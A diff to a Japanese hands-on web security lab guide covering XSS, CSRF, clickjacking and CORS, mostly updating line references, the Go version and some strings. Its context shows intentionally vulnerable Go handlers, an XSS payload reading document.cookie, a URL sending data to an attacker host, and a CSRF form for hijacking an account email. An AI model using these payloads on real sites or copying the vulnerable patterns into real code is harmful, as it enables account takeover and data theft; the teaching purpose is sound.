@@ -2,7 +2,7 @@
 
 > **⏱️ 所要時間**: 約 120 分（4 つの独立セクション — 分割実施を推奨）
 > **🎯 レベル**: 中級
-> **💻 環境**: Linux / macOS（Go 1.22+、ブラウザ。コンテナはローカルで動作）
+> **💻 環境**: Linux / macOS（Go 1.26+、ブラウザ。コンテナはローカルで動作）
 >
 > > **⚠️ 本実習は 4 つの独立したセクション（XSS / CSRF / クリックジャッキング / CORS）から構成されています。時間に応じて分割して実施してください。**
 
@@ -209,10 +209,10 @@ go run main.go
     単に URL をリクエストするだけでデータを外部送信できるため
 ```
 
-**脆弱なコード (victim/main.go:77-80):**
+**脆弱なコード (victim/main.go:93-96):**
 
 ```go
-for _, c := range data.Comments {
+for _, c := range comments {
     // ❌ 脆弱性: ユーザー入力をエスケープせずにそのまま出力
     fmt.Fprintf(w, "<li>%s</li>", c)
 }
@@ -255,13 +255,13 @@ HTML出力: <p>0 results found for "<img src=x onerror=alert(document.cookie)>".
    <img onerror> はフィルタをバイパスできる
 ```
 
-**脆弱なコード (victim/main.go:84-89):**
+**脆弱なコード (victim/main.go:100-105):**
 
 ```go
 func reflectedXSSHandler(w http.ResponseWriter, r *http.Request) {
     q := r.URL.Query().Get("q")
     // ❌ 脆弱性: クエリパラメータをそのままHTMLに埋め込み
-    fmt.Fprintf(w, "<h1>検索結果</h1><p>「%s」の検索結果は0件です。</p>", q)
+    fmt.Fprintf(w, "<h1>Search Results</h1><p>0 results found for \"%s\".</p>", q)
 }
 ```
 
@@ -299,7 +299,7 @@ http://victim-site.com/search?q=<img src=x onerror="new Image().src='https://evi
 [攻撃者サイトのHTML]
 <form action="http://localhost:8080/update-email" method="POST">
     <input type="hidden" name="email" value="hacker@evil.com">
-    <input type="submit" value="賞品を受け取る">
+    <input type="submit" value="Claim Prize">
 </form>
 
 ↓ ユーザーがボタンをクリック
@@ -384,7 +384,7 @@ Cookieによる「認証」は成功 → メールアドレスが変更される
 └─────────────────────────────────────┘
 ```
 
-**脆弱なコード (victim/main.go:119-139):**
+**脆弱なコード (victim/main.go:137-157):**
 
 ```go
 func followHandler(w http.ResponseWriter, r *http.Request) {
@@ -402,7 +402,7 @@ func followHandler(w http.ResponseWriter, r *http.Request) {
 
 ```javascript
 // 攻撃者は被害者のボタン位置を把握し、偽ボタンの位置を調整
-// padding-top: 105px → 被害者のボタンと位置が一致
+// .fake-btn { margin-top: 105px } → 被害者のボタンと位置が一致
 ```
 
 ---
@@ -460,14 +460,16 @@ Origin が一致 → 許可
 → 攻撃者サイトのJavaScriptがレスポンスを読み取れる！
 ```
 
-**脆弱なコード (victim/main.go:141-):**
+**脆弱なコード (victim/main.go:159-188):**
 
 ```go
 func profileHandler(w http.ResponseWriter, r *http.Request) {
-    // ❌ 脆弱性: Origin Reflection
+    // ❌ 脆弱性: Origin Reflection（任意のオリジンを信頼）
     origin := r.Header.Get("Origin")
-    w.Header().Set("Access-Control-Allow-Origin", origin)
-    w.Header().Set("Access-Control-Allow-Credentials", "true")
+    if origin != "" {
+        w.Header().Set("Access-Control-Allow-Origin", origin)
+        w.Header().Set("Access-Control-Allow-Credentials", "true")
+    }
 
     // 認証済みユーザーの機密データを返す
     json.NewEncoder(w).Encode(profile)
